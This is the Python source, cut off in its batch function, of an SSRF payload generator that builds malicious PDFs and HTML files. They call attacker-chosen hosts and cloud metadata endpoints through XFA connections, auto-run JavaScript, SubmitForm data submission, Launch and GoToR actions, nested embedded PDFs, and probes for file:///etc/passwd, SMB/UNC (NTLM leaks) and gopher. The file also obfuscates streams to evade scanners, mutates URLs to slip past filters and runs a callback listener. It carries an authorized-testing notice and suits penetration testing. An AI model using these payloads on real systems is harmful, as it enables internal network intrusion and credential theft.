#!/usr/bin/env python3
"""
PDF & HTML SSRF Test File Generator (Enhanced Version v3.0)
============================================================
Covers the full SSRF test matrix for PDF-centric attack surfaces:

  Scenario B: Malicious PDF parsed/previewed by server
      xfa, js, filespec, submit, launch, uri, importdata, gotor, gotoe,
      rendition, aa, embedded (NEW), multi (expanded), all

  Scenario E: Protocol matrix probing (NEW/EXPANDED)
      http, https, file, ftp, gopher, dict, smb (UNC), ldap, jar, netdoc,
      plus automatic URL mutation (decimal/octal/hex IP, IPv6, localhost
      aliases, userinfo confusion) via --mutate

  Scenario A: HTML-to-PDF engine testing (NEW)
      --html mode generates an HTML payload file with every dangerous
      subresource vector (<img>, <script>, <link>, <iframe>, <svg image>,
      <video>, <audio>, @font-face, <embed>, <object>, <base>, meta refresh,
      CSS url()/@import/background/list-style-image), optionally with
      mutated URLs.

  Scenario C: Template-injection probes (NEW)
      --html --template emits small injectable fragments for business
      fields (remark/logo-url/background) instead of a full document.

Features (inherited + new):
  - FlateDecode compression, ASCIIHex obfuscation, junk objects,
    hex-encoded URLs, chained /Next actions
  - Threaded callback listener with per-request logging (path+headers)
    so protocol probes can be distinguished
  - Batch generation with sha256/size JSON report
  - Reproducible randomness via --seed
  - Structural validation (--dry-run)

LEGAL NOTICE: Authorized security testing ONLY. Use strictly within
written penetration-testing scope or your own defensive research lab.

Usage:
  # Scenario B: classic PDF SSRF
  python pdf_ssrf_gen3.py --type xfa --url http://169.254.169.254/latest/meta-data/ -o xfa.pdf
  python pdf_ssrf_gen3.py --type all --url http://cb.example.com/ --compress --obfuscate --junk 20 -o stealth.pdf

  # Scenario E: protocol matrix with listener
  python pdf_ssrf_gen3.py --type multi --url http://YOUR_IP:8888/ --listen 8888 --timeout 90 -o multi.pdf
  python pdf_ssrf_gen3.py --type multi --url http://YOUR_IP:8888/ --mutate -o multi_mut.pdf

  # Scenario B: embedded-file chain
  python pdf_ssrf_gen3.py --type embedded --url http://cb/ -o emb.pdf

  # Scenario A: HTML payload for HTML-to-PDF engines
  python pdf_ssrf_gen3.py --html --url http://YOUR_IP:8888/ --mutate -o payload.html
  python pdf_ssrf_gen3.py --html --template --url http://YOUR_IP:8888/ -o fragments.txt

  # Batch with subset
  python pdf_ssrf_gen3.py --batch --types xfa,js,uri,embedded,multi --url http://t/ --seed 1337
"""

import argparse
import sys
import os
import json
import zlib
import hashlib
import random
import string
import threading
import time
import logging
from datetime import datetime
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse

__version__ = "3.0.0"

# ---------- Logging ----------
logger = logging.getLogger('pdf_ssrf_gen')
_handler = logging.StreamHandler(sys.stdout)
_handler.setFormatter(logging.Formatter('[%(levelname)s] %(message)s'))
logger.addHandler(_handler)
logger.setLevel(logging.INFO)

# ---------- Reproducible randomness ----------
_rng = random.Random()


def set_seed(seed):
    _rng.seed(seed)


# ============================================================
#                     Escaping Utilities
# ============================================================

def escape_pdf_string(s: str) -> str:
    """Escape a PDF literal string."""
    return (s.replace('\\', '\\\\')
             .replace('(', '\\(')
             .replace(')', '\\)')
             .replace('\r', '\\r')
             .replace('\n', '\\n'))


def js_escape(s: str) -> str:
    """Escape backslashes and single quotes for a JS string literal."""
    return s.replace('\\', '\\\\').replace("'", "\\'")


def pdf_js_string(s: str) -> str:
    """Double-layer escaping: JS-level then PDF-literal-level."""
    return escape_pdf_string(js_escape(s))


def xml_escape(s: str) -> str:
    return (s.replace('&', '&amp;')
             .replace('<', '&lt;')
             .replace('>', '&gt;')
             .replace('"', '&quot;')
             .replace("'", '&apos;'))


def hex_encode_url_in_pdf(url: str) -> str:
    return '<' + url.encode('latin-1', errors='replace').hex().upper() + '>'


# ============================================================
#                NEW: URL Mutation Engine (Scenario E)
# ============================================================

def _ipv4_to_int(ip: str) -> int:
    parts = [int(p) for p in ip.split('.')]
    return (parts[0] << 24) | (parts[1] << 16) | (parts[2] << 8) | parts[3]


def mutate_host(host: str) -> list:
    """Generate parser-confusion host variants for a given host.

    For IPv4 literals: decimal, octal, hex, short forms, IPv6-mapped.
    For 'localhost': aliases and loopback family.
    For normal hostnames: userinfo confusion and trailing-dot tricks.
    """
    variants = set()
    h = host.strip('[]')

    if h in ('localhost', 'localhost.localdomain'):
        variants.update([
            '127.0.0.1', '127.1', '127.0.1', '0.0.0.0', '0',
            '2130706433',                 # decimal 127.0.0.1
            '0177.0.0.1', '0x7f.0.0.1',   # octal / hex first octet
            '0x7f000001',                 # full hex
            '[::1]', '[::ffff:127.0.0.1]', '[0:0:0:0:0:ffff:7f00:1]',
            'localhost.', 'localtest.me',
        ])
    else:
        try:
            n = _ipv4_to_int(h)
            p = h.split('.')
            variants.update([
                str(n),                              # decimal
                '.'.join('0' + x for x in p),        # leading-zero octal-ish
                '0x%x' % n,                          # full hex
                '.'.join('0x%x' % int(x) for x in p),# per-octet hex
                p[0] + '.' + str(int(''.join(p[1:]) or '0')),  # short form a.b
                '[::ffff:' + h + ']',                # IPv6-mapped
            ])
        except (ValueError, IndexError):
            # hostname: userinfo / authority confusion
            variants.update([
                'trusted.example@' + h,
                h + '@trusted.example',
                h + '.',
                h + '#@trusted.example',
            ])
    return sorted(variants)


def mutate_url(url: str) -> list:
    """Apply host mutation to a URL, preserving scheme/port/path."""
    parsed = urlparse(url)
    host = parsed.hostname or ''
    if not host:
        return [url]
    port = (':%d' % parsed.port) if parsed.port else ''
    path = parsed.path or '/'
    if parsed.query:
        path += '?' + parsed.query
    out = []
    for v in mutate_host(host):
        out.append('%s://%s%s%s' % (parsed.scheme, v, port, path))
    return out


# ============================================================
#                     Obfuscation Utilities
# ============================================================

def ascii_hex_encode(data: bytes) -> bytes:
    """ASCIIHexEncode with random whitespace insertion (evasion)."""
    hex_encoded = data.hex().upper()
    result = ''
    for ch in hex_encoded:
        result += ch
        if _rng.random() < 0.08:
            result += _rng.choice([' ', '\t', '\r\n'])
    result += '>'  # EOD marker
    return result.encode()


def generate_junk_key(length: int = 8) -> str:
    return ''.join(_rng.choices(string.ascii_letters, k=length))


def generate_junk_value(length: int = 32) -> str:
    return ''.join(_rng.choices(string.ascii_letters + string.digits, k=length))


# ============================================================
#                      PDF Builder
# ============================================================

class PDFBuilder:
    """Low-level PDF document builder with compression and obfuscation."""

    def __init__(self, compress: bool = False, obfuscate: bool = False,
                 junk_count: int = 0, hex_url: bool = False):
        self.compress = compress
        self.obfuscate = obfuscate
        self.junk_count = junk_count
        self.hex_url = hex_url
        self.objects = {}          # obj_num -> body bytes
        self.next_obj = 1
        self.catalog_num = None

    # ----- object management -----

    def reserve_object(self) -> int:
        num = self.next_obj
        self.next_obj += 1
        self.objects[num] = None
        return num

    def add_object(self, body: bytes) -> int:
        num = self.reserve_object()
        self.objects[num] = body
        return num

    def update_object(self, num: int, body: bytes):
        if num not in self.objects:
            raise KeyError('object %d not reserved' % num)
        self.objects[num] = body

    def add_stream_object(self, data: bytes, extra_dict: bytes = b'') -> int:
        """Add a stream, applying Filter chain per compress/obfuscate flags."""
        filters = []
        if self.compress:
            data = zlib.compress(data)
            filters.append('/FlateDecode')
        if self.obfuscate:
            data = ascii_hex_encode(data)
            filters.append('/ASCIIHexDecode')
        filter_part = b''
        if filters:
            arr = ' '.join(filters)
            filter_part = (' /Filter [ %s ] ' % arr).encode()
        dict_part = (b'<< /Length ' + str(len(data)).encode() +
                     filter_part + (b' ' + extra_dict if extra_dict else b'') + b' >>')
        body = dict_part + b'\nstream\n' + data + b'\nendstream'
        return self.add_object(body)

    # ----- helpers -----

    def format_url(self, url: str) -> str:
        if self.hex_url:
            return hex_encode_url_in_pdf(url)
        return '(%s)' % escape_pdf_string(url)

    def add_junk_objects(self):
        """Diversified junk/decoy objects."""
        for _ in range(self.junk_count):
            kind = _rng.randint(0, 3)
            k, v = generate_junk_key(), generate_junk_value()
            if kind == 0:
                body = ('<< /%s (%s) /Type /Metadata >>' % (k, v)).encode()
            elif kind == 1:
                body = ('[%d (%s) /%s]' % (_rng.randint(0, 9999), v, k)).encode()
            elif kind == 2:
                body = ('<< /%s %d /Length %d >>' %
                        (k, _rng.randint(0, 10 ** 6), _rng.randint(1, 512))).encode()
            else:
                body = self._junk_stream(k, v)
            self.add_object(body)

    def _junk_stream(self, k, v) -> bytes:
        data = generate_junk_value(64).encode()
        return (b'<< /Length ' + str(len(data)).encode() +
                (' /%s (%s) >>\nstream\n' % (k, v)).encode() +
                data + b'\nendstream')

    # ----- output -----

    def validate(self) -> list:
        errors = []
        for num, body in self.objects.items():
            if body is None:
                errors.append('object %d reserved but never written' % num)
        if self.catalog_num is None:
            errors.append('no catalog object finalized')
        return errors

    def generate(self, path: str):
        errors = self.validate()
        if errors:
            raise ValueError('validation failed: ' + '; '.join(errors))
        if self.junk_count:
            self.add_junk_objects()

        out = bytearray(b'%PDF-1.7\n%\xe2\xe3\xcf\xd3\n')
        offsets = {}
        for num in sorted(self.objects.keys()):
            offsets[num] = len(out)
            out += ('%d 0 obj\n' % num).encode()
            out += self.objects[num]
            out += b'\nendobj\n'

        xref_pos = len(out)
        max_obj = max(self.objects.keys())
        out += ('xref\n0 %d\n' % (max_obj + 1)).encode()
        out += b'0000000000 65535 f \n'
        for num in range(1, max_obj + 1):
            if num in offsets:
                out += ('%010d 00000 n \n' % offsets[num]).encode()
            else:
                out += b'0000000000 65535 f \n'
        out += (b'trailer\n<< /Size ' + str(max_obj + 1).encode() +
                b' /Root ' + str(self.catalog_num).encode() + b' 0 R >>\n')
        out += ('startxref\n%d\n%%%%EOF\n' % xref_pos).encode()

        with open(path, 'wb') as f:
            f.write(bytes(out))
        return path


# ============================================================
#                   Shared Structure Helpers
# ============================================================

def create_page_structure(builder: PDFBuilder):
    """Create a minimal Page + Pages tree; returns (page_ref, pages_ref)."""
    content_ref = builder.add_stream_object(b'')
    page_ref = builder.reserve_object()
    pages_ref = builder.reserve_object()
    page_body = (b'<< /Type /Page /Parent %d 0 R '
                 b'/MediaBox [0 0 612 792] '
                 b'/Contents %d 0 R >>' % (pages_ref, content_ref))
    builder.update_object(page_ref, page_body)
    pages_body = b'<< /Type /Pages /Kids [%d 0 R] /Count 1 >>' % page_ref
    builder.update_object(pages_ref, pages_body)
    return page_ref, pages_ref


def finalize_catalog(builder: PDFBuilder, entries: str):
    catalog_body = ('<< /Type /Catalog %s >>' % entries).encode()
    catalog_ref = builder.add_object(catalog_body)
    builder.catalog_num = catalog_ref


# ============================================================
#                      PDF Type Builders
# ============================================================

def build_xfa(url: str, builder: PDFBuilder):
    """XFA connection SSRF — targets PDFBox, iText, Apache Tika."""
    escaped_url_xml = xml_escape(url)
    page_ref, pages_ref = create_page_structure(builder)

    xfa_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
  <template xmlns="http://www.xfa.org/schema/xfa-template/3.3/">
    <subform name="form1">
      <pageSet>
        <pageArea>
          <contentArea x="0" y="0" w="612pt" h="792pt"/>
          <medium stock="default" short="612pt" long="792pt"/>
        </pageArea>
      </pageSet>
      <field name="field1"/>
    </subform>
  </template>
  <datasets xmlns="http://www.xfa.org/schema/xfa-data/1.0/"><data/></datasets>
  <connectionSet xmlns="http://www.xfa.org/schema/xfa-connection-set/2.8/">
    <wsdlConnection name="ssrf" dataDescription="dd">
      <wsdlAddress>{escaped_url_xml}</wsdlAddress>
      <soapAction/>
      <soapAddress>{escaped_url_xml}</soapAddress>
    </wsdlConnection>
    <xmlConnection name="ssrf_xml">
      <uri>{escaped_url_xml}</uri>
    </xmlConnection>
  </connectionSet>
  <config xmlns="http://www.xfa.org/schema/xci/3.1/">
    <present><pdf><interactive>1</interactive></pdf></present>
  </config>
</xdp:xdp>'''
    xfa_stream_ref = builder.add_stream_object(xfa_xml.encode())

    acro_body = ('<< /XFA [%d 0 R] >>' % xfa_stream_ref).encode()
    acro_ref = builder.add_object(acro_body)

    finalize_catalog(builder,
                     '/Pages %d 0 R /AcroForm %d 0 R' % (pages_ref, acro_ref))


def build_js(url: str, builder: PDFBuilder):
    """JavaScript auto-execution SSRF — requires JS-enabled parser/viewer."""
    js_url = pdf_js_string(url)
    page_ref, pages_ref = create_page_structure(builder)

    js_code = f'''
try {{ app.launchURL('{js_url}', false); }} catch(e) {{}}
try {{ this.submitForm({{ cURL: '{js_url}', cSubmitAs: 'HTML' }}); }} catch(e) {{}}
try {{ var r = Net.HTTP.request({{ cURL: '{js_url}', cVerb: 'GET' }}); }} catch(e) {{}}
try {{ var s = new SOAP(); }} catch(e) {{}}
try {{ util.readFileIntoStream('{js_url}'); }} catch(e) {{}}
'''
    action_body = ('<< /Type /Action /S /JavaScript /JS (%s) >>'
                   % escape_pdf_string(js_code)).encode()
    action_ref = builder.add_object(action_body)

    finalize_catalog(builder,
                     '/Pages %d 0 R /OpenAction %d 0 R' % (pages_ref, action_ref))


def build_filespec(url: str, builder: PDFBuilder):
    """FileSpec / external image SSRF — image XObject /F + embedded FileSpec."""
    url_ref = builder.format_url(url)
    page_ref, pages_ref = create_page_structure(builder)

    # Image XObject whose data is fetched from /F
    img_dict = ('/Type /XObject /Subtype /Image /Width 1 /Height 1 '
                '/BitsPerComponent 8 /ColorSpace /DeviceRGB /F %s' % url_ref).encode()
    builder.add_stream_object(b'\xff\x00\x00', img_dict)

    # Classic FileSpec with external reference
    filespec_body = ('<< /Type /Filespec /F (payload.bin) /UF (payload.bin) '
                     '/EF << /F << /Type /EmbeddedFile /Subtype /application#2Foctet-stream '
                     '/Params << /Size 4 >> >> >> /URL %s >>' % url_ref).encode()
    builder.add_object(filespec_body)

    # URI action as the trigger
    action_body = ('<< /Type /Action /S /URI /URI %s >>' % url_ref).encode()
    action_ref = builder.add_object(action_body)

    finalize_catalog(builder,
                     '/Pages %d 0 R /OpenAction %d 0 R' % (pages_ref, action_ref))


def build_submit(url: str, builder: PDFBuilder):
    """SubmitForm action SSRF — form data exfiltration to remote URL."""
    url_ref = builder.format_url(url)
    page_ref, pages_ref = create_page_structure(builder)

    field_body = (b'<< /Type /Annot /Subtype /Widget /FT /Tx /T (exfil) '
                  b'/V (ssrf_marker_value) /Rect [0 0 100 20] >>')
    field_ref = builder.add_object(field_body)

    action_body = ('<< /Type /Action /S /SubmitForm /F %s '
                   '/Fields [%d 0 R] /Flags 4 >>' % (url_ref, field_ref)).encode()
    action_ref = builder.add_object(action_body)

    acro_body = ('<< /Fields [%d 0 R] >>' % field_ref).encode()
    acro_ref = builder.add_object(acro_body)

    finalize_catalog(builder,
                     '/Pages %d 0 R /AcroForm %d 0 R /OpenAction %d 0 R'
                     % (pages_ref, acro_ref, action_ref))


def build_launch(url: str, builder: PDFBuilder):
    """Launch action — legacy readers; on Windows may resolve UNC paths."""
    url_ref = builder.format_url(url)
    page_ref, pages_ref = create_page_structure(builder)

    action_body = ('<< /Type /Action /S /Launch '
                   '/F %s /Win << /F %s >> >>' % (url_ref, url_ref)).encode()
    action_ref = builder.add_object(action_body)

    finalize_catalog(builder,
                     '/Pages %d 0 R /OpenAction %d 0 R' % (pages_ref, action_ref))


def build_uri(url: str, builder: PDFBuilder):
    """Plain /URI action — widest parser support."""
    url_ref = builder.format_url(url)
    page_ref, pages_ref = create_page_structure(builder)

    action_body = ('<< /Type /Action /S /URI /URI %s >>' % url_ref).encode()
    action_ref = builder.add_object(action_body)

    finalize_catalog(builder,
                     '/Pages %d 0 R /OpenAction %d 0 R' % (pages_ref, action_ref))


def build_importdata(url: str, builder: PDFBuilder):
    """ImportData action SSRF — FDF/XFDF import (targets iText, PDFBox)."""
    url_ref = builder.format_url(url)
    page_ref, pages_ref = create_page_structure(builder)

    action_body = ('<< /Type /Action /S /ImportData /F %s >>' % url_ref).encode()
    action_ref = builder.add_object(action_body)

    finalize_catalog(builder,
                     '/Pages %d 0 R /OpenAction %d 0 R' % (pages_ref, action_ref))


def build_gotor(url: str, builder: PDFBuilder):
    """GoToR action SSRF — remote PDF navigation (triggers remote fetch)."""
    url_ref = builder.format_url(url)
    page_ref, pages_ref = create_page_structure(builder)

    action_body = ('<< /Type /Action /S /GoToR '
                   '/F %s /D [0 /Fit] >>' % url_ref).encode()
    action_ref = builder.add_object(action_body)

    finalize_catalog(builder,
                     '/Pages %d 0 R /OpenAction %d 0 R' % (pages_ref, action_ref))


def build_gotor_embedded(url: str, builder: PDFBuilder):
    """GoToE action SSRF — jump into an embedded/remote document."""
    url_ref = builder.format_url(url)
    page_ref, pages_ref = create_page_structure(builder)

    action_body = ('<< /Type /Action /S /GoToE '
                   '/F %s /D [0 /Fit] /NewWindow true >>' % url_ref).encode()
    action_ref = builder.add_object(action_body)

    finalize_catalog(builder,
                     '/Pages %d 0 R /OpenAction %d 0 R' % (pages_ref, action_ref))


def build_rendition(url: str, builder: PDFBuilder):
    """Rendition / multimedia SSRF — external media clip reference."""
    url_ref = builder.format_url(url)
    page_ref, pages_ref = create_page_structure(builder)

    media_clip = ('<< /Type /MediaClip /S /MCD '
                  '/CT (video/unknown) /D %s >>' % url_ref).encode()
    mc_ref = builder.add_object(media_clip)

    rendition = ('<< /Type /Rendition /S /MR /N (ssrf) /C %d 0 R >>' % mc_ref).encode()
    r_ref = builder.add_object(rendition)

    action_body = ('<< /Type /Action /S /Rendition /R %d 0 R /OP 0 >>'
                   % r_ref).encode()
    action_ref = builder.add_object(action_body)

    finalize_catalog(builder,
                     '/Pages %d 0 R /OpenAction %d 0 R' % (pages_ref, action_ref))


def build_aa(url: str, builder: PDFBuilder):
    """Additional Actions — multiple lifecycle triggers (/O /C /WC /WS /PV)."""
    url_ref = builder.format_url(url)
    page_ref, pages_ref = create_page_structure(builder)

    def uri_action():
        body = ('<< /Type /Action /S /URI /URI %s >>' % url_ref).encode()
        return builder.add_object(body)

    action_close = uri_action()
    action_open = uri_action()

    # page-level /AA: /O open, /C close; document-level /AA: /WC /WS
    page_body = builder.objects[page_ref]
    page_body = page_body.replace(
        b'>>',
        (b'/AA << /O %d 0 R /C %d 0 R >> '
         b'/Annots [<< /Type /Annot /Subtype /Widget /Rect [0 0 1 1] '
         b'/AA << /PV << /Type /Action /S /URI /URI %s >> >> >>] >>'
         % (action_open, action_close, url_ref)), 1)
    builder.update_object(page_ref, page_body)

    finalize_catalog(builder,
                     '/Pages %d 0 R /AA << /WC %d 0 R /WS %d 0 R >>'
                     % (pages_ref, action_close, action_open))


def build_embedded(url: str, builder: PDFBuilder):
    """NEW: EmbeddedFiles chain — a nested PDF carrying its own /OpenAction URI.

    Targets pipelines that extract attachments and re-parse them
    (DLP, mail gateways, thumbnailers, 'flatten/repair' tools).
    """
    url_ref = builder.format_url(url)

    # --- inner PDF payload (a tiny valid PDF with an OpenAction URI) ---
    inner_action = ('<< /Type /Action /S /URI /URI %s >>' % url_ref)
    inner_pdf = (
        '%PDF-1.5\n'
        '1 0 obj\n<< /Type /Catalog /Pages 2 0 R /OpenAction 3 0 R >>\nendobj\n'
        '2 0 obj\n<< /Type /Pages /Kids [4 0 R] /Count 1 >>\nendobj\n'
        '3 0 obj\n' + inner_action + '\nendobj\n'
        '4 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>\nendobj\n'
        'trailer\n<< /Root 1 0 R >>\n%%EOF\n'
    ).encode('latin-1')

    ef_stream = builder.add_stream_object(
        inner_pdf,
        b'/Type /EmbeddedFile /Subtype /application#2Fpdf '
        b'/Params << /Size ' + str(len(inner_pdf)).encode() + b' >>')

    filespec = ('<< /Type /Filespec /F (inner.pdf) /UF (inner.pdf) '
                '/EF << /F %d 0 R /UF %d 0 R >> >>' % (ef_stream, ef_stream)).encode()
    fs_ref = builder.add_object(filespec)

    names = ('<< /EmbeddedFiles << /Names [(inner.pdf) %d 0 R] >> >>' % fs_ref).encode()
    names_ref = builder.add_object(names)

    page_ref, pages_ref = create_page_structure(builder)

    # Also a GoToE pointing at the embedded file, to force attachment open
    gotoe = ('<< /Type /Action /S /GoToE /F %d 0 R /D [0 /Fit] '
             '/NewWindow true >>' % fs_ref).encode()
    gotoe_ref = builder.add_object(gotoe)

    finalize_catalog(builder,
                     '/Pages %d 0 R /Names %d 0 R /OpenAction %d 0 R'
                     % (pages_ref, names_ref, gotoe_ref))


def build_multi_protocol(url: str, builder: PDFBuilder):
    """EXPANDED protocol matrix probe.

    Tests: http, https, file, ftp, gopher, dict, smb/UNC (NEW),
    ldap (NEW), jar (NEW), netdoc (NEW), data (NEW, negative control).
    """
    parsed = urlparse(url)
    host = parsed.netloc or parsed.path
    port = parsed.port or 80

    protocols = [
        ('http',   'http://%s/ssrf_http' % host),
        ('https',  'https://%s/ssrf_https' % host),
        ('file',   'file:///etc/passwd'),
        ('file_h', 'file://%s/ssrf_file' % host),
        ('ftp',    'ftp://%s/ssrf_ftp' % host),
        ('gopher', 'gopher://%s:%d/_ssrf_gopher' % (host, port)),
        ('dict',   'dict://%s:%d/ssrf_dict' % (host, port)),
        # --- NEW vectors (v3) ---
        ('smb',    'smb://%s/ssrf_share/marker' % host),        # NTLM leak
        ('unc',    'file:////%s/ssrf_share/marker' % host),     # UNC via file://
        ('ldap',   'ldap://%s/dc=ssrf,dc=test' % host),
        ('jar',    'jar:http://%s/ssrf.jar!/' % host),          # Java chains
        ('netdoc', 'netdoc://%s/ssrf_netdoc' % host),           # legacy Java
        ('data',   'data:text/plain,ssrf_negative_control'),    # control
    ]

    page_ref, pages_ref = create_page_structure(builder)

    action_refs = []
    for proto_name, proto_url in protocols:
        proto_url_ref = builder.format_url(proto_url)
        action_body = ('<< /Type /Action /S /URI /URI %s >>'
                       % proto_url_ref).encode()
        ref = builder.add_object(action_body)
        action_refs.append((ref, proto_name))

    # chain via /Next
    for i in range(len(action_refs) - 1):
        ref, name = action_refs[i]
        next_ref = action_refs[i + 1][0]
        proto_url_ref = builder.format_url(protocols[i][1])
        chained = ('<< /Type /Action /S /URI /URI %s /Next %d 0 R >>'
                   % (proto_url_ref, next_ref)).encode()
        builder.update_object(ref, chained)

    first_ref = action_refs[0][0]
    finalize_catalog(builder,
                     '/Pages %d 0 R /OpenAction %d 0 R' % (pages_ref, first_ref))


def build_all(url: str, builder: PDFBuilder):
    """Combined payload — XFA + JS + FileSpec + SubmitForm + URI (chained)."""
    escaped_url_xml = xml_escape(url)
    js_url = pdf_js_string(url)
    url_ref = builder.format_url(url)

    page_ref = builder.reserve_object()
    pages_ref = builder.reserve_object()

    # Image XObject with /F
    img_dict = ('/Type /XObject /Subtype /Image /Width 1 /Height 1 '
                '/BitsPerComponent 8 /ColorSpace /DeviceRGB /F %s' % url_ref).encode()
    img_ref = builder.add_stream_object(b'\xff\x00\x00', img_dict)

    content_ref = builder.add_stream_object(b'q 100 0 0 100 0 0 cm /Im0 Do Q')

    page_body = (b'<< /Type /Page /Parent %d 0 R /MediaBox [0 0 612 792] '
                 b'/Resources << /XObject << /Im0 %d 0 R >> >> '
                 b'/Contents %d 0 R >>' % (pages_ref, img_ref, content_ref))
    builder.update_object(page_ref, page_body)
    pages_body = b'<< /Type /Pages /Kids [%d 0 R] /Count 1 >>' % page_ref
    builder.update_object(pages_ref, pages_body)

    # XFA
    xfa_xml = f'''<?xml version="1.0" encoding="UTF-8"?>
<xdp:xdp xmlns:xdp="http://ns.adobe.com/xdp/">
  <connectionSet xmlns="http://www.xfa.org/schema/xfa-connection-set/2.8/">
    <wsdlConnection name="ssrf">
      <wsdlAddress>{escaped_url_xml}</wsdlAddress>
      <soapAddress>{escaped_url_xml}</soapAddress>
    </wsdlConnection>
  </connectionSet>
</xdp:xdp>'''
    xfa_ref = builder.add_stream_object(xfa_xml.encode())

    field_ref = builder.add_object(
        b'<< /Type /Annot /Subtype /Widget /FT /Tx /T (f) /V (v) '
        b'/Rect [0 0 10 10] >>')
    acro_ref = builder.add_object(
        ('<< /XFA [%d 0 R] /Fields [%d 0 R] >>' % (xfa_ref, field_ref)).encode())

    # JS -> SubmitForm -> URI chain
    js_code = f'''
try {{ app.launchURL('{js_url}', false); }} catch(e) {{}}
try {{ this.submitForm({{ cURL: '{js_url}', cSubmitAs: 'HTML' }}); }} catch(e) {{}}
'''
    js_action_ref = builder.add_object(
        ('<< /Type /Action /S /JavaScript /JS (%s) >>'
         % escape_pdf_string(js_code)).encode())
    submit_ref = builder.add_object(b'')
    uri_ref = builder.add_object(b'')

    builder.update_object(js_action_ref,
                          ('<< /Type /Action /S /JavaScript /JS (%s) /Next %d 0 R >>'
                           % (escape_pdf_string(js_code), submit_ref)).encode())
    builder.update_object(submit_ref,
                          ('<< /Type /Action /S /SubmitForm /F %s '
                           '/Fields [%d 0 R] /Flags 4 /Next %d 0 R >>'
                           % (url_ref, field_ref, uri_ref)).encode())
    builder.update_object(uri_ref,
                          ('<< /Type /Action /S /URI /URI %s >>' % url_ref).encode())

    finalize_catalog(builder,
                     '/Pages %d 0 R /AcroForm %d 0 R /OpenAction %d 0 R'
                     % (pages_ref, acro_ref, js_action_ref))


# ============================================================
#               NEW: HTML Payload Generator (Scenario A / C)
# ============================================================

HTML_VECTORS = [
    ('img',        '<img src="{u}">'),
    ('script',     '<script src="{u}"></script>'),
    ('link_css',   '<link rel="stylesheet" href="{u}">'),
    ('iframe',     '<iframe src="{u}"></iframe>'),
    ('svg_image',  '<svg xmlns="http://www.w3.org/2000/svg">'
                   '<image href="{u}" width="1" height="1"/></svg>'),
    ('video',      '<video><source src="{u}"></video>'),
    ('audio',      '<audio src="{u}"></audio>'),
    ('embed',      '<embed src="{u}">'),
    ('object',     '<object data="{u}"></object>'),
    ('base',       '<base href="{u}">'),
    ('meta',       '<meta http-equiv="refresh" content="0;url={u}">'),
    ('css_url',    '<style>body{{background-image:url("{u}")}}</style>'),
    ('css_import', '<style>@import url("{u}");</style>'),
    ('css_list',   '<style>li{{list-style-image:url("{u}")}}</style>'),
    ('fontface',   '<style>@font-face{{font-family:"x";src:url("{u}")}}'
                   '</style><span style="font-family:x">x</span>'),
    ('input',      '<input type="image" src="{u}">'),
]

TEMPLATE_FRAGMENTS = [
    ('remark_html_inject', '<div>{u}</div><img src="{u}">'),
    ('logo_url',           '{u}'),   # drop into a "logo URL" business field
    ('bg_css',             'body{{background:url("{u}")}}'),
    ('ssti_probe',         '{{{{7*7}}}}<img src="{u}">'),
]


def generate_html_payload(url: str, out_path: str, mutate: bool = False,
                          template_mode: bool = False) -> dict:
    """Scenario A/C: HTML subresource SSRF payload file.

    template_mode=True -> emit injectable fragments for business fields.
    """
    urls = mutate_url(url) if mutate else [url]
    lines = []

    if template_mode:
        lines.append('# Template-injection fragments (paste into fields)')
        for i, u in enumerate(urls):
            probe = u.rstrip('/') + '/frag%d' % i
            for name, tpl in TEMPLATE_FRAGMENTS:
                lines.append('## %s [url_variant_%d]' % (name, i))
                lines.append(tpl.format(u=probe))
        content = '\n'.join(lines) + '\n'
    else:
        lines.append('<!DOCTYPE html><html><head><meta charset="utf-8">'
                     '<title>ssrf probe</title></head><body>')
        lines.append('<!-- HTML-to-PDF subresource SSRF probes '
                     '(generator v%s) -->' % __version__)
        for i, u in enumerate(urls):
            lines.append('<h2>URL variant %d: %s</h2>'
                         % (i, u.replace('<', '&lt;')))
            for name, tpl in HTML_VECTORS:
                probe = u.rstrip('/') + '/%s_%d' % (name, i)
                lines.append('<!-- %s -->' % name)
                lines.append(tpl.format(u=probe))
        lines.append('</body></html>')
        content = '\n'.join(lines) + '\n'

    with open(out_path, 'w', encoding='utf-8') as f:
        f.write(content)

    return {
        'type': 'html_template_fragments' if template_mode else 'html',
        'path': out_path,
        'sha256': hashlib.sha256(content.encode()).hexdigest(),
        'size': len(content.encode()),
        'url_variants': len(urls),
        'status': 'ok',
    }


# ============================================================
#                   Build Function Registry
# ============================================================

BUILD_FUNCTIONS = {
    'xfa': build_xfa,
    'js': build_js,
    'filespec': build_filespec,
    'submit': build_submit,
    'launch': build_launch,
    'uri': build_uri,
    'importdata': build_importdata,
    'gotor': build_gotor,
    'gotoe': build_gotor_embedded,
    'rendition': build_rendition,
    'aa': build_aa,
    'embedded': build_embedded,
    'multi': build_multi_protocol,
    'all': build_all,
}


# ============================================================
#                     Callback Listener (enhanced)
# ============================================================

class CallbackHandler(BaseHTTPRequestHandler):
    triggered = False
    hits = []

    def _log_hit(self):
        CallbackHandler.triggered = True
        CallbackHandler.hits.append({
            'time': datetime.now().isoformat(),
            'method': self.command,
            'path': self.path,
            'headers': {k: v for k, v in self.headers.items()},
        })

    def do_GET(self):
        self._log_hit()
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        self.wfile.write(b'ok')

    do_POST = do_PUT = do_HEAD = do_GET

    def log_message(self, fmt, *args):
        logger.info('[CALLBACK] %s - %s' % (self.client_address[0],
                                            fmt % args))


def start_listener(port: int, bind: str, timeout: int):
    server = ThreadingHTTPServer((bind, port), CallbackHandler)
    server.timeout = 1.0

    def serve():
        logger.info('[LISTENER] Listening on %s:%d (timeout %ds)'
                    % (bind, port, timeout))
        deadline = time.time() + timeout
        while time.time() < deadline:
            server.handle_request()
            if CallbackHandler.triggered:
                logger.info('[LISTENER] SSRF callback received!')
                drain_until = time.time() + 2
                while time.time() < drain_until:
                    server.handle_request()
                break
        if not CallbackHandler.triggered:
            logger.warning('[LISTENER] Timeout reached. No callback received.')
        else:
            logger.info('[LISTENER] Total hits: %d'
                        % len(CallbackHandler.hits))
        server.server_close()

    thread = threading.Thread(target=serve, daemon=True,
                              name='callback-listener')
    thread.start()
    return server, thread


# ============================================================
#                     Batch Generation
# ============================================================

def batch_generate(url: str, output_dir: str, compress: bool = False,
                   obfuscate: bool = False, junk_count: int = 0,
                   hex_url: bool = False, types: list = None,
                   mutate: bool = False, include_html: bool = False):
    """Generate payload types and produce a JSON report."""
